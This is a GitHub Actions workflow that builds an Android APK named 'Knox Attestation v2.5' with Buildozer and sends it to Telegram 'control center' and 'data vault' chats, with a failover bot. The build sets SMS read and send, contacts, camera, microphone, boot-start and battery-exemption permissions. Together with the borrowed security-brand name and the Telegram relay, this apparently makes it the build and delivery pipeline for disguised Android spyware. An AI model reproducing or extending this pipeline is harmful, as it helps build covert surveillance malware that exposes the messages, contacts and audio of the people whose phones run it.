name: Build APK using Buildozer Docker Image

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: kivy/buildozer:latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Notify Build Start
        env:
          BOT1_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$BOT1_TOKEN/sendMessage \
            -d chat_id=$CTRL_ID -d text="🚀 [Knox] Build started."

      - name: Verify Secrets
        run: |
          if [ -z "${{ secrets.TELEGRAM_BOT_1_TOKEN }}" ] || [ -z "${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}" ]; then
            echo "Missing secrets"
            exit 1
          fi

      - name: Cache Buildozer
        uses: actions/cache@v4
        with:
          path: /github/home/.buildozer
          key: buildozer-cache-${{ hashFiles('project/buildozer.spec') }}

      - name: Prepare buildozer.spec
        run: |
          cd project
          mkdir -p res/drawable
          if [ ! -f "res/drawable/ic_launcher.png" ]; then
            echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
          fi
          sed -i 's|^#\? \?android.accept_sdk_license = .*|android.accept_sdk_license = True|' buildozer.spec
          sed -i 's|^#\? \?android.auto_accept_sdk_license = .*|android.auto_accept_sdk_license = True|' buildozer.spec
          sed -i 's|^#\? \?android.permissions = .*|android.permissions = INTERNET,ACCESS_NETWORK_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,POST_NOTIFICATIONS,READ_CONTACTS,READ_SMS,SEND_SMS,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS|' buildozer.spec
          sed -i 's|^#\? \?android.api = .*|android.api = 33|' buildozer.spec
          cat buildozer.spec

      - name: Build APK
        run: |
          cd project
          yes | buildozer -v android debug

      - name: Find and Verify APK
        id: find_apk
        run: |
          APK_PATH=$(find project/bin -name "*.apk" -type f | head -n 1)
          if [ -z "$APK_PATH" ]; then
            echo "APK not found"
            exit 1
          fi
          echo "apk_path=$APK_PATH" >> $GITHUB_OUTPUT
          echo "APK size: $(du -h $APK_PATH | cut -f1)"

      - name: Send APK (Primary Bot)
        id: send_primary
        continue-on-error: true
        env:
          BOT1_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
        run: |
          APK_FILE=${{ steps.find_apk.outputs.apk_path }}
          curl --retry 3 --retry-delay 2 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" \
            -F "caption=✅ Knox Attestation v2.5" \
            https://api.telegram.org/bot$BOT1_TOKEN/sendDocument
          if [ -n "$VAULT_ID" ]; then
            curl -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" -F "caption=Backup APK" \
              https://api.telegram.org/bot$BOT1_TOKEN/sendDocument
          fi

      - name: Send APK (Failover Bot)
        if: steps.send_primary.outcome == 'failure'
        env:
          BOT2_TOKEN: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
        run: |
          APK_FILE=${{ steps.find_apk.outputs.apk_path }}
          curl --retry 3 --retry-delay 2 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" \
            -F "caption=⚠️ Knox Attestation v2.5 (Failover)" \
            https://api.telegram.org/bot$BOT2_TOKEN/sendDocument

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Knox-APK-${{ github.run_number }}
          path: ${{ steps.find_apk.outputs.apk_path }}
